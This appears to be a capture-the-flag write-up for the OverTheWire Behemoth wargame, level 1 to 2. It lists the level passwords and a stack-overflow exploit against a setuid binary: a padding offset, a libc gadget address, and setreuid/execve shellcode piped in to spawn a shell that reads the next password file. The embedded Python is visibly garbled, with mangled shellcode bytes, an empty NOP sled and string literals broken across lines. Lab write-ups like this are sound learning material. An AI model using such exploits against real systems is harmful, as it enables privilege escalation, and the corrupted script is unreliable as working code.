# Behemoth Level 01 to 02

| Field | Value |
|---|---|
| Platform | OverTheWire |
| Wargame | Behemoth |
| Level | 1 -> 2 |
| Status | Complete |

## Objective

Exploit the stack overflow in `behemoth1` to spawn a shell as `behemoth2`.

## Given Access

User: `behemoth1`

Password:

```text
8YpAQCAuKf
```

## Recon

The binary reads attacker-controlled input into a fixed stack buffer. The verified live offset to the saved return address was `71`, and a reliable `call esp` gadget was available in `/lib32/libc.so.6` at `0xf7e9377d`.

A plain `/bin/sh` payload was not enough on this host because the shell dropped the target privilege. A `setreuid(13002,13002)` prelude was required before `execve("/bin/sh")`.

## Method

Build a payload with:

- `71` bytes of padding
- return address `0xf7e9377d`
- a short NOP sled
- shellcode that calls `setreuid(13002,13002)` and then `execve("/bin/sh")`

Pipe the payload into `/behemoth/behemoth1`, then immediately read the next password inside the spawned shell.

## Commands

```bash
ssh -p 2221 behemoth1@behemoth.labs.overthewire.org
python3 - <<'PY' | /behemoth/behemoth1
import struct, sys
shellcode = (
    b"1À°F1Ûf»Ê21Éf¹Ê2Í"
    b"1ÀPh//shh/binãPSá1Ò°Í"
)
payload = b"A" * 71 + struct.pack("<I", 0xf7e9377d) + b"" * 64 + shellcode + b"
"
sys.stdout.buffer.write(payload)
sys.stdout.write("id
cat /etc/behemoth_pass/behemoth2
exit
")
PY
```

## Result

Password for `behemoth2`:

```text
IxPJbQtH8q
```

## Lesson

On setuid overflow levels, “got a shell” is not enough. Verify the effective UID and preserve privileges explicitly when needed.

## References

- https://overthewire.org/wargames/behemoth/
